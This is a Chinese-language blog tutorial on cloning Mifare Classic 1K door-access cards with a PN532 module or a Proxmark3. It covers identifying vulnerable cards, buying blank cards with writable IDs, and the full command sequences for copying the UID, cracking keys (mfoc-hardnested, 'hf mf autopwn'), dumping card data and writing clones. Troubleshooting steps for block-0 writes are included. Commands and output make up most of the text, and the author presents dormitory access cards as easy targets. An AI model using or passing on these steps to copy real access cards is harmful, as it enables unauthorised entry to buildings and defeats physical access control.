CRYPTO1: 门禁卡破解 (Proxmark, PN532)
==================================


> 2015 年 Crypto1 被宣布理论死亡，这篇文章理论应用实践，介绍如何破解门禁卡。

之前一篇文章介绍了 Crypto1 加密算法，是如何被人逆向工程，并公开了算法细节，随后从认证方式 (Authentication) 到 核心算法 (Crypto1) 全部被破解，最终在 2015 年使用 Crypto1 加密算法的 NXP Mifare Classic 卡 (M1 卡) 迎来了理论上的死亡。

- [CRYPTO1: 密码分析学 (门禁卡破解)](https://zhuanlan.zhihu.com/p/465900396)
 
![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/mifare.png)

然而实际上，Crypto1 并没有完结，直到 2023 年，M1 卡还在国内外大量使用。例如从国内硕士宿舍，到英国博士的学生宿舍，都可以轻松地复制门禁卡。

我不禁在想，可能知道 Crypto1 被破解的人，还不够多。

> 这篇文章就让知道的人，越来越多。

## 1. NFC 卡选择

首先，我们需要鉴定自己的 NFC 卡是不是可以破解的，毕竟越来越多的学校、公司开始用更安全的卡。

我们先确定门禁卡的频率，如果把卡放在支持 NFC 的手机背后，手机有响应的话，说明这张卡是常见的 13.56MHz，有被破解的可能。

> 如果没有响应，那么可以关掉浏览器去玩耍了。

除了常见的 13.56MHz 高频，还有一些老旧的学校大楼门禁用的是 125kHz 低频，例如华科曾经的动力楼等，这种低频卡也是可以轻易复制的。

为了进一步确认卡的型号，我们可以在支持 NFC 的手机上安装 NFC Tools，读取要复制的卡片型号。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/nfc_tools.png)

比如，这张卡被识别为脆弱的 NXP - Mifare Classic 1k。

> 如果不是这个型号，也可以关掉浏览器去玩耍了。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/m1.png)

**另外，需要确认卡的 ID (Serial Number) 是 4 位的**，比如有的卡是 7 位的，就在暗示你关掉浏览器去玩耍。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/m1-7.png)

如果你手上这张卡不幸是 NXP - Mifare Classic 1k，以及有 4 位的 ID，那么请不要关闭浏览器。



## 2. 硬件购买

接下来我们需要下面的硬件 (一般淘宝 20 包邮)：

- PN532 模块：用来和卡片通信，读取卡片数据；
- USB-TTL：把 PN532 和 电脑 用串口通信连接起来。
- 一张空白卡用来复制 (UID，CUID)。

一张门禁卡里面，存储了卡的 ID 和 数据。**如果要复制一张卡，就要同时复制 ID 和数据**，但是合法的卡片 ID 是不能修改的，所以不合法的中国厂家造出了可以修改 ID 的卡，留了一些通信后门。

- **第一代不合法的卡片被称为 UID 卡**，它们有特殊的后门指令，用来修改卡片的 ID。于是一些门禁系统为了防范不合法的卡，会故意向卡片发送后门指令，只要卡片响应了，说明它不合法，拒绝开门。
- **第二代的非法卡片，被称为 CUID 卡**。它们不通过后门修改 ID，不会响应后门指令，而是通过正常的指令，修改原本不能修改的 ID，所以不容易被门禁系统察觉。

> 如果你对 NFC 不太熟悉，就只买 UID 卡；如果复制完不能用，再买 CUID 卡。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/pn532.png)

> 不幸的是，毕竟买的是非法的 NFC 卡，店家也可能会非法随机发货。

比如，**我曾经买了 10 张第二代 CUID 卡，结果收到了 4 张 125Khz 的低频卡，4 张 CUID 卡，和 2 张 UID 卡**。所以我们在收到卡片后，需要确认一下卡片的型号。



## 3. PN532 破解

同样，我们可以先用支持 NFC 的手机，读取卡片型号，没有响应的可能就是 125kHz 低频卡。

在筛选掉低频卡后，我们进一步确认卡片是有后门的一代 UID 卡，还是没有后门的二代 CUID 卡。

### 3.1 libnfc 安装

我们把 PN532 连接到电脑后，在 Ubuntu 下安装 libnfc：

```
$ sudo apt install libnfc-dev libnfc-bin libnfc-examples libnfc-pn53x-examples
```

接下来修改 libnfc 的配置文件 `/etc/nfc/libnfc.conf`，在最后一行加上 PN532 和电脑通信的串口： 

```
$ sudo vim /etc/nfc/libnfc.conf

    device.name = "pn532"
    device.connstring = "pn532_uart:/dev/ttyUSB0"
```

我们把卡片放在 PN532 上，就可以 sudo nfc-list读取卡片的信息了：

```
$ sudo nfc-list 
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 01  02  03  04  
      SAK (SEL_RES): 08  
```

如果这里没有读取到卡片信息，可以检查下卡片是不是没贴紧模块，再确认 PN532 的拨码开关都是 OFF。

> PN532 模块支持 串口 (HSU)，I2C，SPI 通信，模块正面有2个拨码开关，默认都是 OFF，代表串口。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/pn532_switch.png)

我们先尝试用后门指令修改卡的 ID 为 01 02 03 04，如果顺利修改，说明是有后门的第一代 UID；如果修改失败，就是第二代 CUID。

```
$ sudo nfc-mfsetuid 01020304
$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 01  02  03  04  
      SAK (SEL_RES): 08  
```

> 当然，也有可能店家合法发货，给了你一张合法的卡片，没有修改 ID 功能。

如果前面顺利修改了空白卡的 ID，我们就可以把门禁卡的 ID 复制到空白卡上了：

```
# 把门禁卡放到 PN532 上
$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 11  22  33  44  
      SAK (SEL_RES): 08  

# 把空白卡放到 PN532 上
# 记得把下面的 11223344 替换成上面读出来的4位ID
$ sudo nfc-mfsetuid 11223344
```

**这样，非法空白卡就有了和你门禁卡一样的 ID，接下来就是复制数据了。**



### 3.2 mfoc-hardnested 破解

到这里，我们确认了非法卡片的型号，接下来就可以破解原始卡片了。

我们先安装 mfoc-hardnested。 

```
$ git clone https://github.com/nfc-tools/mfoc-hardnested
$ cd mfoc-hardnested
$ ./configure
$ make && sudo make install
```

**接下来把要破解的门禁卡，放到 PN532 上破解卡数据：**

```
$ sudo mfoc-hardnested -O mycard.mfd
```

好，结束了！！ 破解出来的卡片数据在 mycard.mfd里面。



### 3.3 复制卡片

最后，我们需要把复制出来的数据，写入到空白的 UID 卡里面。

```
$ sudo nfc-mfclassic w a mycard.mfd
```

好，又结束了！！



### 3.4 其他问题

如果一切顺利，我们就已复制完成了 ID 和 数据。

这里顺便一提，如果下次想要复制一张新的卡，需要告诉软件原来的卡数据。因为向 NFC 卡写数据，需要知道卡的密钥 (KeyA / KeyB)，而密钥就包含在数据里。

```
$ nfc-mfclassic w a new_data.mfd old_data.mfd
```

> 有的卡复制完后，控制位可能被改成了只读，从此不能修改数据。 如果对 NFC 控制位不熟，建议就用空白卡复制。



## 4. Proxmark3 破解

> 如果你已经顺利破解了，已经可以关掉浏览器了，接下来介绍的是另一种破解方法。

PN532 是一种低成本的解决办法，而 Proxmark (AVR + FPGA) 则是针对 NFC 开发者的工具，Proxmark 可以读取高频，低频，各种型号卡的数据，甚至它本身就可以模拟 NFC 卡，所以价格比 PN532 高出不少。

![img](https://doc.wuhanstudio.cc/posts/crypto1_pn532/proxmark.png)

> Proxmark 是针对开发者的工具，所以接下来不会有太多科普的内容。



### 4.1 Proxmark 3 安装

Proxmark 有很多型号，这里我用的是 Proxmark 3。

```
$ git clone https://github.com/RfidResearchGroup/proxmark3
$ cd proxmark3
$ cp Makefile.platform.sample Makefile.platform
$ vim Makefile.platform
    PLATFORM=PM3GENERIC
$ make
```

接下来 Proxmark 连接电脑，就可以看到启动信息:

```
$ sudo ./pm3
[=] Session log /root/.proxmark3/logs/log_20231105180758.txt
[+] loaded from JSON file `/root/.proxmark3/preferences.json`
[=] Using UART port /dev/ttyACM0
[=] Communicating with PM3 over USB-CDC


  8888888b.  888b     d888  .d8888b.   
  888   Y88b 8888b   d8888 d88P  Y88b  
  888    888 88888b.d88888      .d88P  
  888   d88P 888Y88888P888     8888"  
  8888888P"  888 Y888P 888      "Y8b.  
  888        888  Y8P  888 888    888  
  888        888   "   888 Y88b  d88P 
  888        888       888  "Y8888P"    [ ☕ ]


QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
  [ Proxmark3 RFID instrument ]

    MCU....... AT91SAM7S512 Rev B
    Memory.... 512 KB ( 61% used )

    Client.... Iceman/master/v4.17140-285-g7026fd69f 2023-11-05 18:06:30
    Bootrom... Iceman/master/5ae919d-dirty-suspect 2023-10-18 21:12:50 
    OS........ Iceman/master/5ae919d-dirty-suspect 2023-10-18 21:13:01 
    Target.... PM3 GENERIC

[usb] pm3 --> 
```



### 4.2 Proxmark3 破解

我们可以先用 `hf search` 确保卡片可以被识别到。

```
[usb] pm3 --> hf search
 🕔  Searching for ISO14443-A tag...          
[+]  UID: 01 02 03 04 
[+] ATQA: 00 04
[+]  SAK: 08 [2]
[+] Possible types:
[+]    MIFARE Classic 1K
[=] proprietary non iso14443-4 card found, RATS not supported
[+] Magic capabilities : Gen 1a
[+] Prng detection: weak
[#] Auth error
[?] Hint: try `hf mf` commands
```

接下来就可以 `hf mf autopwn` 自动破解了：

```
[usb] pm3 --> hf mf autopwn                   
[!] ⚠️  no known key was supplied, key recovery might fail
[+] loaded 56 keys from hardcoded default array
[=] running strategy 1
[=] Chunk 0.3s | found 32/32 keys (56)
......
[+] Generating binary key file
[+] Found keys have been dumped to /root/hf-mf-01020304-key.bin
[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0
[=] transferring keys to simulator memory ( ok )
[=] dumping card content to emulator memory (Cmd Error: 04 can occur)
[=] downloading card content from emulator memory
[+] saved 1024 bytes to binary file /root/hf-mf-01020304-dump.bin
[+] saved to json file /root/hf-mf-01020304-dump.json
[=] autopwn execution time: 2 seconds
```

可以看到，破解出来的密钥和数据，分别保存到了 hf-mf-01020304-key.bin 和 hf-mf-01020304-dump.bin。



### 4.3 Proxmark3 复制

 我们可以复制破解出来的数据到空白的卡片。

```
$ hf mf cload -f hf-mf-01020304-dump.eml
```



### 4.4 常见问题

 然而实际操作可能不会那么顺利，下面是常见问题的解决办法。

**[1]** **wupC1 error Can't set magic card block: 0**

这说明这张卡不是有后门的一代卡，不能通过后门指令写入数据，我们需要用 hexedit 查看 hf-mf-01020304-dump.bin 里 block0 的数据，手动写入。

```
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
```

**[2]** **BCC0 incorrect, got 0x04, expected 0x00**

之前我们可能写入了一些错误的数据，破坏了卡的结构，例如 Block0，导致给出了错误的响应。

Proxmark 默认把读取的卡片当作正常卡，所以收到错误响应的时候，就会停止操作。但是，我们也可以选择忽略警告，继续操作来修复卡的数据。

```
$ hf 14a config --bcc ignore
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
$ hf 14a config --bcc std
```

下面都是类似的，忽略不同的警告，来修复卡片的数据。

**[3]** **Card didn't answer to CL2 select all**

```
$ hf 14a config --cl2 skip
$ hf mf cload -f hf-mf-01020304-dump.eml
$ hf 14a config --cl2 std
```

**[4]** **Card doesn't support standard iso14443-3 anticollision**

```
$ hf 14a config --atqa force --bcc ignore --cl2 skip --cl3 skip --rats skip
$ hf mf wrbl --force --blk 0 -k FFFFFFFFFFFF -d 010203040408040000004A495256494E
$ hf 14a config --atqa std --bcc std --cl2 std --cl3 std --rats std
```



## 总结

如果你对 NFC 卡的数据结构 (KeyA/ KeyB / Block) 不太熟悉，用 PN532 + UID (第一代后门) 可以避免很多问题。

当 PN532 + UID 卡无法成功复制的时候，就可以考虑尝试开发者工具 Proxmark + CUID (第二代) 卡。